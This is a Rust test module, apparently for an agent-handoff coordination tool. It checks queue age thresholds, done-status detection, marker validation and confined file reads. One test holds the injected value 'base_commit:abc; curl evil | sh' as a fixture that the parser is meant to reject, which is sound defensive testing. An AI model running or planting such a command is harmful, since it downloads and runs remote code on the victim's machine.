        snapshot.open_queue_signals.pickup_sample = crate::pickup_threshold::MIN_ROOM_SAMPLE - 1;
        let now = chrono::Utc::now().timestamp();
        let items = open_queue_items(&snapshot, "codex", &FsSignals::default(), now);
        let codes = items[0].reasons.iter().map(|r| r.code).collect::<Vec<_>>();
        assert_eq!(
            codes,
            vec!["later_fact_reports_done"],
            "no age label below N"
        );
        assert_eq!(items[0].pickup_p95_secs, None);
        assert_eq!(items[0].pickup_p95_source, "insufficient_history");

        snapshot.open_queue_signals.pickup_sample = crate::pickup_threshold::MIN_ROOM_SAMPLE;
        let items = open_queue_items(&snapshot, "codex", &FsSignals::default(), now);
        let codes = items[0].reasons.iter().map(|r| r.code).collect::<Vec<_>>();
        assert_eq!(
            codes,
            vec!["later_fact_reports_done", "older_than_room_pickup_p95"]
        );
        assert_eq!(
            items[0].pickup_p95_secs,
            Some(3 * 3600),
            "the repo's own p95"
        );
        assert_eq!(items[0].pickup_p95_source, "room");
    }

    /// Two repos, one fast and one slow: each threshold comes from its own
    /// ledger only. Adding the other repo's history changes nothing.
    #[test]
    fn each_repo_threshold_ignores_every_other_repo() {
        let room = |prefix: &str, hours: i64| {
            let mut facts = Vec::new();
            for i in 0..10_i64 {
                facts.push(handoff(&format!("{prefix}h{i}"), i * 2 + 1, None, &at(0)));
                facts.push(closer(
                    &format!("{prefix}c{i}"),
                    i * 2 + 2,
                    &format!("{prefix}h{i}"),
                    &at(hours),
                ));
            }
            facts
        };
        let (fast, slow) = (room("f", 2), room("s", 300));
        let fast_t = project_signals(&fast, &[]).effective_p95();
        let slow_t = project_signals(&slow, &[]).effective_p95();
        assert_eq!(fast_t.secs, Some(2 * 3600));
        assert_eq!(slow_t.secs, Some(300 * 3600));
        // Re-deriving the fast repo after the slow one exists elsewhere: same.
        let again = project_signals(&fast, &[]).effective_p95();
        assert_eq!(again, fast_t);
    }

    #[test]
    fn named_handoffs_and_system_closes_do_not_feed_the_open_queue_p95() {
        let mut facts = Vec::new();
        for i in 0..30 {
            facts.push(handoff(&format!("n{i}"), i * 2 + 1, Some("codex"), &at(0)));
            facts.push(closer(
                &format!("c{i}"),
                i * 2 + 2,
                &format!("n{i}"),
                &at(1),
            ));
        }
        let mut reaper = closer("reaper", 999, "q", &at(500));
        reaper.role = Some("system".to_string());
        facts.push(handoff("q", 998, None, &at(0)));
        facts.push(reaper);
        assert_eq!(room_pickup_p95(&facts), (0, None));
    }

    #[test]
    fn later_done_fact_on_the_same_thread_or_ref_marks_revalidation() {
        let item = handoff("q", 1, None, &at(0));
        let mut same_thread = handoff("reply", 2, None, &at(1));
        same_thread.kind = FactKind::Artifact;
        same_thread.thread_id = item.thread_id.clone();
        same_thread.subject = "P1-P3 LANDED".to_string();
        let mut unrelated = same_thread.clone();
        unrelated.event_id = "other".to_string();
        unrelated.thread_id = "room_other".to_string();
        let mut wake = same_thread.clone();
        wake.event_id = "wake".to_string();
        wake.kind = FactKind::Wake;
        let facts = vec![item.clone(), same_thread, unrelated, wake];
        let signals = project_signals(&facts, std::slice::from_ref(&item));
        assert_eq!(
            signals.later_done.get("q"),
            Some(&vec!["reply".to_string()])
        );
    }

    #[test]
    fn status_report_handoffs_are_steered_to_artifact() {
        assert!(status_report_warning("D1/D2/D3 shipped", None).is_some());
        assert!(status_report_warning("LANDED", Some("all green")).is_some());
        assert!(status_report_warning("CORRECTION: reverted 72c4741", None).is_some());
        assert!(status_report_warning("shipped D1 — please verify on device", None).is_none());
        assert!(status_report_warning("landed; can you rebase?", None).is_none());
        assert!(status_report_warning("implement the parser", None).is_none());
    }

    #[test]
    fn base_commit_takes_rallys_marker_and_rejects_non_hex() {
        let evidence = vec![
            "base_commit:abc; curl evil | sh".to_string(),
            "base_commit:0123456789abcdef".to_string(),
        ];
        assert_eq!(base_commit(&evidence), Some("0123456789abcdef"));
        assert_eq!(
            base_commit(&["base_commit:abc; curl evil | sh".to_string()]),
            None
        );
        assert!(is_reserved_base_marker("basehash:src/a.rs=00"));
        assert!(!is_reserved_base_marker("lease_expires_at:x"));
    }

    fn typed_reply(id: &str, seq: i64, tool: &str, handoff: &Fact, kind: &str) -> Fact {
        Fact {
            schema: crate::FACT_SCHEMA.to_string(),
            event_id: id.to_string(),
            seq,
            thread_id: handoff.thread_id.clone(),
            kind: FactKind::Handoff,
            tool: Some(tool.to_string()),
            from_session_id: Some("session-receiver".to_string()),
            subject: "reply".to_string(),
            created_at: at(1),
            target: handoff.tool.clone(),
            ref_id: Some(handoff.event_id.clone()),
            evidence: vec![
                "protocol:bridge_version=fact-v1".to_string(),
                format!("protocol:event_kind={kind}"),
                "protocol:target_policy=ref-author".to_string(),
                "protocol:to_session_id=session-sender".to_string(),
                format!("protocol:ref_event_id={}", handoff.event_id),
                format!("protocol:causation_id={}", handoff.event_id),
                format!("protocol:correlation_id={}", handoff.thread_id),
                format!("protocol:handoff_id=h-{id}"),
                format!("protocol:idempotency_key=op-{id}"),
            ],
            ..Fact::default()
        }
    }

    /// F2: a whitespace-padded target names the same addressee here as in
    /// `handoff_address`, so its receiver's rejection still counts.
    #[test]
    fn padded_target_rejection_matches_the_trimmed_addressee() {
        let handoff = handoff("named", 1, Some("  codex:07 "), &at(0));
        let reject = typed_reply("r1", 2, "codex:07", &handoff, "handoff.rejected");
        assert!(
            crate::store::handoff_response_is_rejection(&reject),
            "fixture is a typed rejection"
        );
        let rejected = rejected_named(&[handoff.clone(), reject], std::slice::from_ref(&handoff));
        assert!(rejected.contains("named"), "{rejected:?}");
    }

    /// F1, at the projection: the latest receiver reply decides.
    #[test]
    fn latest_receiver_reply_wins_over_an_earlier_rejection() {
        let handoff = handoff("named", 1, Some("codex:07"), &at(0));
        let reject = typed_reply("r1", 2, "codex:07", &handoff, "handoff.rejected");
        let accept = typed_reply("a1", 3, "codex:07", &handoff, "handoff.accepted");
        let open = std::slice::from_ref(&handoff);
        assert!(
            rejected_named(&[handoff.clone(), reject.clone(), accept.clone()], open).is_empty()
        );
        let mut later_reject = reject;
        later_reject.seq = 4;
        assert!(rejected_named(&[handoff.clone(), accept, later_reject], open).contains("named"));
    }

    #[test]
    fn oversize_and_overflow_base_markers_both_count_as_dropped() {
        let long = format!("basehash:{}=00", "x".repeat(50));
        let markers = vec![
            "base_commit:abcdef1".to_string(),
            long,
            "basehash:a=00".to_string(),
        ];
        // Item length 40 rejects the long marker; one free slot keeps one.
        let (kept, dropped) = fit_base_markers(markers.clone(), 1, 40);
        assert_eq!(kept, vec!["base_commit:abcdef1".to_string()]);
        assert_eq!(dropped, 2, "one oversize + one past the free slots");
        let (kept, dropped) = fit_base_markers(markers, 10, 40);
        assert_eq!(kept.len(), 2);
        assert_eq!(dropped, 1, "the oversize marker alone");
    }

    #[test]
    fn done_words_are_whole_words() {
        assert!(reports_done("D1/D2/D3 shipped"));
        assert!(reports_done("CORRECTION: fix LANDED in 72c4741"));
        assert!(!reports_done("abandoned the donee plan"));
        assert!(!reports_done("please review"));
    }

    #[test]
    fn old_items_are_revalidated_never_removed() {
        let mut snapshot = RoomSnapshot::default();
        // This repo has enough history for an age signal: p95 = 1 day.
        snapshot.open_queue_signals.pickup_sample = crate::pickup_threshold::MIN_ROOM_SAMPLE;
        snapshot.open_queue_signals.room_pickup_p95_secs = Some(86_400);
        snapshot
            .open_handoffs
            .push(handoff("ancient", 1, None, "2000-01-01T00:00:00Z"));
        snapshot
            .open_handoffs
            .push(handoff("fresh", 2, None, &chrono::Utc::now().to_rfc3339()));
        snapshot
            .open_handoffs
            .push(handoff("named", 3, Some("codex"), "2000-01-01T00:00:00Z"));
        let items = open_queue_items(
            &snapshot,
            "codex",
            &FsSignals::default(),
            chrono::Utc::now().timestamp(),
        );
        let ids = items
            .iter()
            .map(|i| i.event_id.as_str())
            .collect::<Vec<_>>();
        assert_eq!(ids, vec!["fresh", "ancient"], "valid first; named excluded");
        assert!(!items[0].revalidate_before_claiming);
        assert!(items[1].revalidate_before_claiming);
        assert_eq!(items[1].reasons[0].code, "older_than_room_pickup_p95");
        assert_eq!(items[1].ownership, "available, unowned");
    }

    #[test]
    fn own_postings_are_not_offered_back() {
        let mut snapshot = RoomSnapshot::default();
        snapshot
            .open_handoffs
            .push(handoff("mine", 1, None, &chrono::Utc::now().to_rfc3339()));
        let items = open_queue_items(&snapshot, "claude_code", &FsSignals::default(), 0);
        assert!(items.is_empty());
    }

    fn temp_root(label: &str) -> PathBuf {
        let dir = std::env::temp_dir().join(format!(
            "rally-open-queue-{label}-{}-{}",
            std::process::id(),
            chrono::Utc::now().timestamp_nanos_opt().unwrap_or_default()
        ));
        std::fs::create_dir_all(&dir).unwrap();
        dir.canonicalize().unwrap()
    }

    #[test]
    fn fs_probe_flags_changed_scope_and_done_plan_and_stays_in_the_room() {
        let root = temp_root("probe");
        std::fs::write(root.join("a.rs"), "fn a() {}").unwrap();
        std::fs::create_dir_all(root.join(".build-loop/coordination")).unwrap();
        std::fs::write(
            root.join(".build-loop/coordination/plan.md"),
            "# Plan\n**Status:** P1+P2+P3 landed; P4 deferred\n",
        )
        .unwrap();
        let outside = temp_root("outside");
        std::fs::write(outside.join("secret.md"), "Status: done\n").unwrap();

        let mut item = handoff("q", 1, None, &at(0));
        item.tool = Some("claude_code".to_string());
        item.scope = vec!["file:a.rs".to_string()];
        let base = base_markers(&root, &item.scope);
        item.evidence = base;
        item.evidence.push(format!(
            "{{\"coord_file\":\"{}\"}}",
            root.join(".build-loop/coordination/plan.md").display()
        ));
        item.evidence
            .push(outside.join("secret.md").display().to_string());

        let mut snapshot = RoomSnapshot::default();
        snapshot.open_handoffs.push(item.clone());

        // Unchanged file: only the plan reason.
        let fs = probe_fs(&snapshot, "codex", &root);
        let codes = fs.by_event["q"].iter().map(|r| r.code).collect::<Vec<_>>();
        assert_eq!(
            codes,
            vec!["linked_plan_marks_done"],
            "outside-room path ignored"
        );

        std::fs::write(root.join("a.rs"), "fn a() { changed() }").unwrap();
        let fs = probe_fs(&snapshot, "codex", &root);
        let codes = fs.by_event["q"].iter().map(|r| r.code).collect::<Vec<_>>();
        assert_eq!(
            codes,
            vec!["scope_changed_since_posted", "linked_plan_marks_done"]
        );
    }

    #[test]
    fn room_internals_and_fifos_are_never_read() {
        let root = temp_root("internals");
        std::fs::create_dir_all(root.join(".rally")).unwrap();
        std::fs::write(root.join(".rally/facts.db"), "x").unwrap();
        std::fs::create_dir_all(root.join(".git")).unwrap();
        std::fs::write(root.join(".git/config"), "x").unwrap();
        assert!(confined_file(&root, ".rally/facts.db").is_none());
        assert!(confined_file(&root, "file:.git/config").is_none());
        let fifo = root.join("pipe.md");
        let c = std::ffi::CString::new(fifo.as_os_str().to_str().unwrap()).unwrap();
        assert_eq!(unsafe { libc::mkfifo(c.as_ptr(), 0o600) }, 0);
        // Opening a FIFO for read would block without O_NONBLOCK; this returns.
        assert!(read_regular(&fifo, 64).is_none());
        assert!(!plan_marks_done(&fifo));
    }

    #[test]
    fn later_done_map_is_bounded_and_keeps_the_newest_items() {
        let mut facts = Vec::new();
        let mut open = Vec::new();
        for i in 0..(MAX_LATER_DONE_ITEMS as i64 + 10) {
            let item = handoff(&format!("q{i}"), i * 2 + 1, None, &at(0));
            let mut done = handoff(&format!("d{i}"), i * 2 + 2, None, &at(1));
            done.kind = FactKind::Artifact;
            done.thread_id = item.thread_id.clone();
            done.subject = "shipped".to_string();
            open.push(item.clone());
            facts.push(item);
            facts.push(done);
        }
        let signals = project_signals(&facts, &open);
        assert_eq!(signals.later_done.len(), MAX_LATER_DONE_ITEMS);
        assert!(
            signals
                .later_done
                .contains_key(&format!("q{}", MAX_LATER_DONE_ITEMS + 9))
        );
        assert!(!signals.later_done.contains_key("q0"));
    }

    #[test]
    fn plan_without_done_status_is_not_flagged() {
        let root = temp_root("plan");
        let path = root.join("plan.md");
        std::fs::write(&path, "Status: in progress\nwe are done with lunch\n").unwrap();
        assert!(!plan_marks_done(&path));
        std::fs::write(&path, "---\nstatus: done\n---\n").unwrap();
        assert!(plan_marks_done(&path));
    }
}
